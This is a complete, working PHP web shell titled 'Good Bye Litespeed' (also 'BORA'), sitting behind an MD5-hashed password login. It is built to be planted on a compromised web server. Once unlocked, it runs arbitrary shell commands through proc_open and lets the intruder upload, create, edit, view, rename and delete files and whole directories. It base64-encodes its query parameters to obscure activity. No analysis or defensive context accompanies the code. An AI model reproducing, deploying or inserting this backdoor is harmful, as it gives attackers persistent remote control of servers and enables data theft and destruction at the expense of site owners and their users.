<?php
session_start();
$password = "4a44c08f86ce231ded7ad2f91b1252b8";

function login_shell()
{
?>

<html>
<head>
	<title>BORA</title>
    <link rel="shortcut icon" type="image/x-icon" href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi_KDnK7xzfn9aOPlotx3cPJzlzJ7jakHWhKXodwynrBG6RMF551hP1rtVfO6ZKL4WvbJIuoO94fAWBurYsrI0bTJOuLycy0eHFm1t5XKX_vH9IA5OAa5aBBj3hYcF8nplIMkv_CvNJqO09LPuZL-WaFOP6X-694RHp6WHsEi3jhC7KJjxdQFCYgGuAvQk/s16000/images-removebg-preview.png" />
</head><l
<body>
<div class="login">
    <h2 class="login-header">
        BORA
    </h2>
    <form class="login-container" action="" method="post">
        <div align="center">
            <input type="Password" name="pass" placeholder="&nbsp;Password">&nbsp;<input type="submit" name="submit" value="LOGIN">
          </div>
    </form>
</div>
</body>
</html>

<style>
body {
    background: rgb(87, 87, 87);
    font-family: 'Beautiful Vampires', sans-serif;
    background-image: url(https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEglXXZa_THmxRuyE-SWD3d7wiAOCj02QZjFRhTbK01NIqGL1mI0OAdf8kSh5wNwBVPwefq7jPeHjcHI9xgWnpyRVdF4EP2NVpsWthA3pSowA7zsqbb50-Jguf2GT4Ar60x_4dyHQXGvbZQo25r5NiVXfCvcUH2Rbrd1yqqxNW0d32XbEBIWtI8qSpPKN2k/s16000/corey-mizunaga-finalbw.jpg);
  }
  .login {
    width: 400px;
    margin: 16px auto;
    font-size: 16px;
  }
  /* Reset top and bottom margins from certain elements */
  .login-header,
  .login p {
    margin-top: 0;
    margin-bottom: 0;
  }
  .login-header {
    background: #790000;
    padding: 20px;
    font-size: 1.4em;
    font-weight: normal;
    text-align: center;
    text-transform: uppercase;
    color: #fff;
    border: 2px solid #ffca2d;
  }
  .login-container {
    background: #2d2d2d;
    padding: 12px;
    border-radius: 10px 10px;
  }
  /* Every row inside .login-container is defined with p tags */
  .login p {
    padding: 12px;
  }
  .login input {
    box-sizing: border-box;
    display: block;
    width: 100%;
    border-width: 1px;
    border-style: solid;
    padding: 16px;
    outline: 0;
    font-family: inherit;
    font-size: 0.95em;
  }
  .login input[type="email"],
  .login input[type="password"] {
    background: #e9e9e9;
    border-color: #bbb;
    color: #555;
  }
  /* Text fields' focus effect */
  .login input[type="email"]:focus,
  .login input[type="password"]:focus {
    border-color: #888;
  }
  .login input[type="submit"] {
    background: #790000;
    border-color: transparent;
    color: #fff;
    cursor: pointer;
    border: 2px solid #ffca2d;
    border-radius: 5px 5px;
  }
  .login input[type="submit"]:hover {
    background: #17c;
  }
  /* Buttons' focus effect */
  .login input[type="submit"]:focus {
    border-color: #05a;
  }
</style>

<?php
    exit;
}

if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
    if (isset($_POST['pass']) && (md5($_POST['pass']) == $password)) {
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
        header("refresh: 0;");
    } else {
        login_shell();
    }
} else {
?>

<!DOCTYPE html>
<html>
<head>
    <title>Good Bye Litespeed</title>
    <link href="https://fonts.googleapis.com/css?family=Arial%20Black" rel="stylesheet">
    <style>
    body {
        font-family: 'Arial Black', sans-serif;
        color: #fff;
        margin: 0;
        padding: 0;
        background-color: #242222c9;
    }
    .result-box-container {
        position: relative;
        margin-top: 20px;
    }

    .result-box {
        width: 100%;
        height: 200px;
        padding: 10px;
        border: 1px solid #ddd;
        border-radius: 5px;
        background-color: #f4f4f4;
        overflow: auto;
        box-sizing: border-box;
        font-family: 'Arial Black', sans-serif;
        color: #333;
    }

    .result-box::placeholder {
        color: #999;
    }

    .result-box:focus {
        outline: none;
        border-color: #128616;
    }

    .result-box::-webkit-scrollbar {
        width: 8px;
    }

    .result-box::-webkit-scrollbar-thumb {
        background-color: #128616;
        border-radius: 4px;
    }
    .container {
        max-width: 90%;
        margin: 20px auto;
        padding: 20px;
        background-color: #1e1e1e;
        border-radius: 5px;
        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
    }
    .header {
        text-align: center;
        margin-bottom: 20px;
    }
    .header h1 {
        font-size: 24px;
    }
    .subheader {
        text-align: center;
        margin-bottom: 20px;
    }
    .subheader p {
        font-size: 16px;
        font-style: italic;
    }
    form {
        margin-bottom: 20px;
    }
    form input[type="text"],
    form textarea {
        width: 100%;
        padding: 8px;
        margin-bottom: 10px;
        border: 1px solid #ddd;
        border-radius: 3px;
        box-sizing: border-box;
    }
    form input[type="submit"] {
        width: 100%;
        padding: 10px;
        background-color: #128616;
        color: white;
        border: none;
        border-radius: 3px;
        cursor: pointer;
    }
    .result-box {
            width: 100%;
            height: 200px;
            resize: none;
            overflow: auto;
            font-family: 'Arial Black';
            background-color: #f4f4f4;
            padding: 10px;
            border: 1px solid #ddd;
            margin-bottom: 10px;
        }
    form input[type="submit"]:hover {
        background-color: #143015;
    }
    table {
        width: 100%;
        border-collapse: collapse;
        margin-top: 20px;
    }
    th, td {
        padding: 8px;
        text-align: left;
    }
    th {
        background-color: #5c5c5c;
    }
    tr:nth-child(even) {
        background-color: #9c9b9bce;
    }
    .item-name {
        max-width: 200px;
        overflow: hidden;
        text-overflow: ellipsis;
        white-space: nowrap;
    }
    .size, .date {
        width: 100px;
    }
    .permission {
        font-weight: bold;
        width: 50px;
        text-align: center;
    }
    .writable {
        color: #0db202;
    }
    .not-writable {
        color: #d60909;
    }
textarea[name="file_content"] {
            width: calc(100.9% - 10px);
            margin-bottom: 10px;
            padding: 8px;
            max-height: 500px;
            resize: vertical;
            border: 1px solid #ddd;
            border-radius: 3px;
            font-family: 'Arial Black';
        }
</style>
</head>
<body>
<div class="container">
<?php
$timezone = date_default_timezone_get();
date_default_timezone_set($timezone);
$rootDirectory = realpath($_SERVER['DOCUMENT_ROOT']);
$scriptDirectory = dirname(__FILE__);

function x($b) {
    return base64_encode($b);
}

function y($b) {
    return base64_decode($b);
}

foreach ($_GET as $c => $d) $_GET[$c] = y($d);

$currentDirectory = realpath(isset($_GET['d']) ? $_GET['d'] : $rootDirectory);
chdir($currentDirectory);

$viewCommandResult = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['fileToUpload'])) {
        $target_file = $currentDirectory . '/' . basename($_FILES["fileToUpload"]["name"]);
        if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
            echo "File " . htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " Upload success";
        } else {
            echo "Sorry, there was an error uploading your file.";
        }
    } elseif (isset($_POST['folder_name']) && !empty($_POST['folder_name'])) {
        $newFolder = $currentDirectory . '/' . $_POST['folder_name'];
        if (!file_exists($newFolder)) {
            mkdir($newFolder);
            echo '<hr>Folder created successfully!';
        } else {
            echo '<hr>Error: Folder already exists!';
        }
    } elseif (isset($_POST['file_name']) && !empty($_POST['file_name'])) {
        $fileName = $_POST['file_name'];
        $newFile = $currentDirectory . '/' . $fileName;
        if (!file_exists($newFile)) {
            if (file_put_contents($newFile, $_POST['file_content']) !== false) {
                echo '<hr>File created successfully!';
            } else {
                echo '<hr>Error: Failed to create file!';
            }
        } else {
            if (file_put_contents($newFile, $_POST['file_content']) !== false) {
                echo '<hr>File edited successfully!';
            } else {
                echo '<hr>Error: Failed to edit file!';
            }
        }
    } elseif (isset($_POST['delete_file'])) {
        $fileToDelete = $currentDirectory . '/' . $_POST['delete_file'];
        if (file_exists($fileToDelete)) {
            if (is_dir($fileToDelete)) {
                if (deleteDirectory($fileToDelete)) {
                    echo '<hr>Folder deleted successfully!';
                } else {
                    echo '<hr>Error: Failed to delete folder!';
                }
            } else {
                if (unlink($fileToDelete)) {
                    echo '<hr>File deleted successfully!';
                } else {
                    echo '<hr>Error: Failed to delete file!';
                }
            }
        } else {
            echo '<hr>Error: File or directory not found!';
        }
    } elseif (isset($_POST['rename_item']) && isset($_POST['old_name']) && isset($_POST['new_name'])) {
        $oldName = $currentDirectory . '/' . $_POST['old_name'];
        $newName = $currentDirectory . '/' . $_POST['new_name'];
        if (file_exists($oldName)) {
            if (rename($oldName, $newName)) {
                echo '<hr>Item renamed successfully!';
            } else {
                echo '<hr>Error: Failed to rename item!';
            }
        } else {
            echo '<hr>Error: Item not found!';
        }
    } elseif (isset($_POST['cmd_input'])) {
        $command = $_POST['cmd_input'];
        $descriptorspec = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        $process = proc_open($command, $descriptorspec, $pipes);
        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]);
            $errors = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            if (!empty($errors)) {
                $viewCommandResult = '<hr><p>Result:</p><textarea class="result-box">' . 
htmlspecialchars($errors) . '</textarea>';
            } else {
                $viewCommandResult = '<hr><p>Result:</p><textarea class="result-box">' . 
htmlspecialchars($output) . '</textarea>';
            }
        } else {
            $viewCommandResult = '<hr><p>Error: Failed to execute command!</p>';
        }
    } elseif (isset($_POST['view_file'])) {
        $fileToView = $currentDirectory . '/' . $_POST['view_file'];
        if (file_exists($fileToView)) {
            $fileContent = file_get_contents($fileToView);
            $viewCommandResult = '<hr><p>Result: ' . $_POST['view_file'] . '</p><textarea class="result-box">' . 
htmlspecialchars($fileContent) . '</textarea>';
        } else {
            $viewCommandResult = '<hr><p>Error: File not found!</p>';
        }
    }
}

echo '<center>
<div class="fig-ansi">
<pre id="taag_font_ANSIShadow" class="fig-ansi"><span style="color: rgb(67, 142, 241);">   <strong>  __    Bye 
Bye Litespeed   _____ __    
    __|  |___ ___ ___ ___ ___   |   __|  | v.1.3
|  |  | .\'| . | . | .\'|   |  |__   |  |__ 
|_____|__,|_  |___|__,|_|_|  |_____|_____|
                |___| ./Heartzz                      </strong> </span></pre>
</div>
</center>';
echo "Zona waktu server: " . $timezone . "<br>";
echo "Waktu server saat ini: " . date('Y-m-d H:i:s');
echo '<hr>Curdir: ';

$directories = explode(DIRECTORY_SEPARATOR, $currentDirectory);
$currentPath = '';
$homeLinkPrinted = false;
foreach ($directories as $index => $dir) {
    $currentPath .= DIRECTORY_SEPARATOR . $dir;
    if ($index == 0) {
        echo ' / <a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
    } else {
        echo ' / <a href="?d=' . x($currentPath) . '">' . $dir . '</a>';
    }
}

echo '<a href="?d=' . x($scriptDirectory) . '"> / <span style="color: green;">[ GO Home ]</span></a>';
echo '<br>';
echo '<hr><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">';
echo '<input type="text" name="folder_name" placeholder="New Folder Name">';
echo '<input type="submit" value="Create Folder">';
echo '</form>';
echo '<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'">';
echo '<input type="text" name="file_name" placeholder="Create New File / Edit Existing File">';
echo '<textarea name="file_content" placeholder="File Content (for new file) or Edit Content (for existing 
file)"></textarea>';
echo '<input type="submit" value="Create / Edit File">';
echo '</form>';
echo '<form method="post" enctype="multipart/form-data">';
echo '<hr>';
echo '<input type="file" name="fileToUpload" id="fileToUpload" placeholder="pilih file:">';
echo '<hr>';
echo '<input type="submit" value="Upload File" name="submit">';
echo '</form>';
echo '<form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : '').'"><input 
type="text" name="cmd_input" placeholder="Enter command"><input type="submit" value="Run Command"></form>';
echo $viewCommandResult;
echo '<div>';
echo '</div>';
echo '<table border=1>';
echo '<br><tr><th><center>Item 
Name</th><th><center>Size</th><th><center>Date</th><th>Permissions</th><th><center>View</th><th><center>Delete</th><th><center>Rename</th></tr></center></center></center>';
foreach (scandir($currentDirectory) as $v) {
    $u = realpath($v);
    $s = stat($u);
    $itemLink = is_dir($v) ? '?d=' . x($currentDirectory . '/' . $v) : 
'?'.('d='.x($currentDirectory).'&f='.x($v));
    $permission = substr(sprintf('%o', fileperms($u)), -4);
    $writable = is_writable($u);
    echo '<tr>
            <td class="item-name"><a href="'.$itemLink.'">'.$v.'</a></td>
            <td class="size">'.filesize($u).'</td>
            <td class="date" style="text-align: center;">'.date('Y-m-d H:i:s', filemtime($u)).'</td>
            <td class="permission '.($writable ? 'writable' : 'not-writable').'">'.$permission.'</td>
            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : 
'').'"><input type="hidden" name="view_file" value="'.htmlspecialchars($v).'"><input type="submit" value=" View 
"></form></td>
            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : 
'').'"><input type="hidden" name="delete_file" value="'.htmlspecialchars($v).'"><input type="submit" 
value="Delete"></form></td>
            <td><form method="post" action="?'.(isset($_SERVER['QUERY_STRING']) ? $_SERVER['QUERY_STRING'] : 
'').'"><input type="hidden" name="old_name" value="'.htmlspecialchars($v).'"><input type="text" name="new_name" 
placeholder="New Name"><input type="submit" name="rename_item" value="Rename"></form></td>
        </tr>';
}

echo '</table>';
function deleteDirectory($dir) {
    if (!file_exists($dir)) {
        return true;
    }
    if (!is_dir($dir)) {
        return unlink($dir);
    }
    foreach (scandir($dir) as $item) {
        if ($item == '.' || $item == '..') {
            continue;
        }
        if (!deleteDirectory($dir . DIRECTORY_SEPARATOR . $item)) {
            return false;
        }
    }
    return rmdir($dir);
}
?>
</div>
</body>
</html>

<?php
}
?>